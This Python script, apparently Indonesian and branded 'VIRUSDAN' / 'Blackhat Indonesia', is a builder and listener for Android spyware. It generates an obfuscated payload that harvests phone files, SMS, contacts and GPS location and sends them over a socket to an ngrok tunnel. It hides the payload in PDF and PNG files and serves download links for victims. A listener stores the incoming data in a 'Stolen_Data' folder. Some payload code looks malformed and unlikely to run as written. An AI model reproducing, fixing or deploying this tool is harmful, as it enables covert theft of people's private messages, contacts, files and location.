import os
import shutil
import socket
import threading
import base64
import random
import string
import time
import requests
from flask import Flask, send_from_directory
from datetime import datetime
import zlib
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich.live import Live
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

app = Flask(__name__)
console = Console()

# Konfigurasi
OUTPUT_DIR = "VIRUSDAN_Payloads"
STOLEN_DATA_DIR = "Stolen_Data"
SERVER_PORT = 8080
FLASK_PORT = 8081
PAYLOAD_NAME = "evil_payload"
NGROK_AUTH_TOKEN = "YOUR_NGROK_AUTH_TOKEN"  # Ganti sama token Ngrok lu
AES_KEY = get_random_bytes(16)  # Kunci enkripsi AES

# ASCII Art buat header
DEWA_HEADER = """
   ╔════════════════════════════════════╗
   ║      VIRUSDAN - MR.4REX_503        ║
   ║     NOT SYSTEM IS SAFE! 😈🔥      ║
   ╚════════════════════════════════════╝
"""

# Fungsi verifikasi kode WAN
def verify_wan_code():
    temp_code = "GFXWRS321"  # Kode WAN yang lu tentuin
    console.print("[cyan]Masukkan kode WAN anda:[/cyan]")
    user_code = console.input("[yellow]Kode: [/yellow]")
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]Verifikasi kode anda...[/cyan]"), transient=True) as progress:
        task = progress.add_task("", total=100)
        for _ in range(100):
            time.sleep(0.03)
            progress.update(task, advance=1)
    
    if user_code == temp_code:
        console.print("[green]Kode anda berhasil! Selamat menjalankan skrip ini 😈[/green]\a")
        return True
    else:
        console.print("[red]Kode anda tidak berhasil! Harap masukkan kode yang valid.[/red]")
        return False

# Bikin folder kalau belum ada
def setup_directories():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)
    if not os.path.exists(STOLEN_DATA_DIR):
        os.makedirs(STOLEN_DATA_DIR)

# Obfuscate string
def obfuscate(code):
    compressed = zlib.compress(code.encode())
    return base64.b64encode(compressed).decode()

# Enkripsi data
def encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(nonce + ciphertext).decode()

# Dekripsi data
def decrypt_data(data):
    data = base64.b64decode(data)
    nonce = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(ciphertext).decode()

# Bikin payload Android (dengan perbaikan untuk connect ke Ngrok)
def create_android_payload(public_url):
    payload_code = (
        f"import os, socket, base64, shutil, time, android.permissions;"
        f"from android.provider import ContactsContract, Telephony;"
        f"from jnius import autoclass;"
        f"LocationManager = autoclass('android.location.LocationManager');"
        f"Context = autoclass('android.content.Context');"
        f"def steal_data():"
        f"    data = {};"
        f"    try:"
        f"        for root, dirs, files in os.walk('/storage/emulated/0'):"
        f"            for file in files:"
        f"                path = os.path.join(root, file);"
        f"                if os.path.getsize(path) < 10485760:"  
        f"                    with open(path, 'rb') as f:"
        f"                        data[path] = base64.b64encode(f.read()).decode();"
        f"        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
        f"            Telephony.Sms.CONTENT_URI, None, None, None, None);"
        f"        while cursor.moveToNext():"
        f"            sms = cursor.getString(cursor.getColumnIndexOrThrow('body'));"
        f"            data['sms_' + str(time.time())] = base64.b64encode(sms.encode()).decode();"
        f"        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
        f"            ContactsContract.Contacts.CONTENT_URI, None, None, None, None);"
        f"        while cursor.moveToNext():"
        f"            contact = cursor.getString(cursor.getColumnIndexOrThrow('display_name'));"
        f"            data['contact_' + str(time.time())] = base64.b64encode(contact.encode()).decode();"
        f"        lm = autoclass('org.kivy.android.PythonActivity').mActivity.getSystemService(Context.LOCATION_SERVICE);"
        f"        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);"
        f"        if location:"
        f"            data['location'] = base64.b64encode(f'{location.getLatitude()},{location.getLongitude()}'.encode()).decode();"
        f"    except: pass;"
        f"    return data;"
        f"def send_data():"
        f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);"
        f"    s.connect(('{public_url.split('//')[1]}', {SERVER_PORT}));"  # Connect ke Ngrok URL
        f"    data = steal_data();"
        f"    for path, content in data.items():"
        f"        packet = f'FILE:{path}:{content}'.encode();"
        f"        s.send(packet);"
        f"        time.sleep(0.1);"
        f"    s.send(b'END');"
        f"    s.close();"
        f"send_data();"
    )
    return obfuscate(payload_code)

# Bikin PDF payload
def generate_pdf_payload(public_url):
    with Progress(SpinnerColumn(), BarColumn(), TextColumn("[cyan]Generating PDF payload...[/cyan]"), transient=True) as progress:  # Lebih heboh
        task = progress.add_task("", total=100)
        for i in range(100):
            time.sleep(0.02)
            progress.update(task, advance=1)
    
    payload = create_android_payload(public_url)
    pdf_content = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n"
        b"4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 24 Tf 100 700 Td (Dokumen Rahasia) Tj ET\nendstream\nendobj\n"
        b"5 0 obj\n<< /Type /EmbeddedFile /Length " + str(len(payload)).encode() + b" >>\nstream\n" + payload.encode() + b"\nendstream\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF"
    )
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pdf_path = os.path.join(OUTPUT_DIR, f"{PAYLOAD_NAME}_{timestamp}.pdf")
    with open(pdf_path, "wb") as f:
        f.write(pdf_content)
    console.print(f"[green]PDF payload tersimpan di: {pdf_path}[/green]")
    return os.path.basename(pdf_path)

# Bikin Gambar payload
def generate_image_payload(public_url):
    with Progress(SpinnerColumn(), BarColumn(), TextColumn("[cyan]Generating Gambar payload...[/cyan]"), transient=True) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            time.sleep(0.02)
            progress.update(task, advance=1)
    
    png_content = (
        b"\x89PNG\r\n\x1a\n"
        b"\x00\x00\x00\x0DIHDR"
        b"\x00\x00\x00\x0A\x00\x00\x00\x0A\x08\x06\x00\x00\x00\x8D\x32\xCB\xF6"
        b"\x00\x00\x00\x01sRGB\x00\xAE\xCE\x1C\xE9"
        b"\x00\x00\x00\x04gAMA\x00\x00\xB1\x8F\x0B\xFC\x61\x05"
    )
    payload = create_android_payload(public_url)
    png_content += b"\x00\x00\x00\x0CIDATx\x9c" + base64.b64decode(payload) + b"\x00\x00\x00\x00IEND\xAE\xB0\x60\x82"
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    png_path = os.path.join(OUTPUT_DIR, f"{PAYLOAD_NAME}_{timestamp}.png")
    with open(png_path, "wb") as f:
        f.write(png_content)
    console.print(f"[green]Gambar payload tersimpan di: {png_path}[/green]")
    return os.path.basename(png_path)

# Auto-Ngrok
def start_ngrok():
    try:
        os.system(f"ngrok authtoken {NGROK_AUTH_TOKEN}")
        ngrok_process = os.popen(f"ngrok http {FLASK_PORT}")
        time.sleep(2)
        response = requests.get("http://localhost:4040/api/tunnels")
        public_url = response.json()["tunnels"][0]["public_url"]
        console.print(f"[yellow]Ngrok link: {public_url}[/yellow]")
        return public_url
    except:
        console.print("[red]Gagal jalanin Ngrok! Kirim manual via WA.[/red]")
        return None

# Server listener dengan CLI lebih heboh
def data_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', SERVER_PORT))
    server_socket.listen(5)
    console.print(f"[magenta]Listener jalan di port {SERVER_PORT}, nunggu target...[/magenta]")
    
    with Live(Progress(SpinnerColumn(), TextColumn("[cyan]Menunggu koneksi target... Siap action! 😈[/cyan]"), refresh_per_second=10), refresh_per_second=4) as live:  # Animasi heboh
        task = live.update(Progress(SpinnerColumn(), TextColumn("[cyan]Sedang memantau...[/cyan]"))
        while True:
            client_socket, addr = server_socket.accept()
            console.print(f"[green]Target connect dari: {addr}[/green]")
            buffer = b""
            while True:
                data = client_socket.recv(1024)
                if not data or b"END" in data:
                    break
                buffer += data
            if buffer.startswith(b"FILE:"):
                try:
                    _, file_path, content = buffer.decode().split(":", 2)
                    file_path = file_path.replace("/storage/emulated/0", "")
                    safe_path = os.path.join(STOLEN_DATA_DIR, f"{addr[0]}{file_path}")
                    os.makedirs(os.path.dirname(safe_path), exist_ok=True)
                    with open(safe_path, "wb") as f:
                        f.write(base64.b64decode(content))
                    console.print(f"[green]Data curian tersimpan di: {safe_path}[/green]")
                except:
                    pass
            client_socket.close()

# Animasi typing
def type_text(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.05)
    print()

# Menu utama
def main_menu():
    setup_directories()
    listener_thread = threading.Thread(target=data_listener, daemon=True)
    listener_thread.start()
    public_url = start_ngrok()
    
    if not verify_wan_code():
        console.print("[red]Akses ditolak! Keluar dari VIRUSDAN.[/red]\a")
        return
    
    while True:
        console.clear()
        console.print(Panel(Text(DEWA_HEADER, style="bold red"), border_style="cyan"))
        console.print("[cyan]=== VIRUSDAN - Mr.4Rex_503 ===[/cyan]\a")
        console.print("[yellow]1. Generate PDF Payload[/yellow]")
        console.print("[yellow]2. Generate Gambar Payload[/yellow]")
        console.print("[yellow]3. Keluar[/yellow]")
        console.print(f"[magenta]Status: Server jalan di port {SERVER_PORT}, Flask di {FLASK_PORT}[/magenta]")
        if public_url:
            console.print(f"[yellow]Ngrok URL: {public_url}/download/[/yellow]")
        
        choice = console.input("[cyan]Pilih opsi (1/2/3): [/cyan]")
        
        if choice == "1":
            filename = generate_pdf_payload(public_url)
            console.print(f"[yellow]Link download: {public_url}/download/{filename}[/yellow]\a")
        elif choice == "2":
            filename = generate_image_payload(public_url)
            console.print(f"[yellow]Link download: {public_url}/download/{filename}[/yellow]\a")
        elif choice == "3":
            console.print("[red]Sampai jumpa, sampai ketemu lagi[/red]\a")
            break
        else:
            console.print("[red]Pilihan salah, bro! Coba lagi.[/red]")
        time.sleep(1)

# Tambah route Flask
@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory(OUTPUT_DIR, filename)

if __name__ == "__main__":
    type_text("Initializing VIRUSDAN... Blackhat Indonesia 😈")
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=FLASK_PORT, debug=False), daemon=True)
    flask_thread.start()
    main_menu()
